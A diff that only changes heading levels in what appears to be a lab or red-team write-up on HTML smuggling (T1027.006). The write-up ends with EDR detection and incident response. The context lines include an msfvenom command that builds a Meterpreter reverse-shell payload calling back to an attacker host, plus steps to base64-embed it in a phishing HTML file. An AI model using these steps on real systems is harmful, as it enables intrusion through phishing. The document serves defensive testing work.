@@ -40,13 +40,13 @@ PowerShell
 
 To bypass standard network-layer controls, an HTML smuggling vector was utilized to deliver a weaponized executable.
 
-#### 1. Generating the Payload:
+### 1. Generating the Payload:
 A stageless Windows x64 Meterpreter reverse TCP payload was generated using msfvenom.
 Bash
 
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Kali_IP> LPORT=4444 -f exe -o payload.exe
 
-#### 2. Assembling the Smuggling Document:
+### 2. Assembling the Smuggling Document:
 The binary was converted into a Base64 string and embedded inside a client-side JavaScript block within T1027_006_smuggling.html.
 Bash
 
@@ -54,7 +54,7 @@ base64 -w 0 payload.exe > base64_exe.txt
 
 (Screenshot Placeholder: HTML code snippet showing the Base64 variable and Blob assembly)
 
-#### 3. Delivery Mechanism:
+### 3. Delivery Mechanism:
 The weaponized HTML file was emailed directly to the target endpoint to simulate a realistic phishing campaign.
 
 #### Phase 2: Execution & Network Evasion
@@ -70,7 +70,7 @@ Plaintext
 When the user opened the phishing attachment, the embedded script utilized a JavaScript Blob array to reassemble the Meterpreter binary directly inside browser memory before forcing a localized disk write.
 
 
-#### Phase 3: EDR Detection & Incident Response
+### Phase 3: EDR Detection & Incident Response
 
 The moment the browser completed the memory compilation and dropped the file to disk, the endpoint controls intervened, moving the workflow from detection to active incident response.
 Automated Prevention
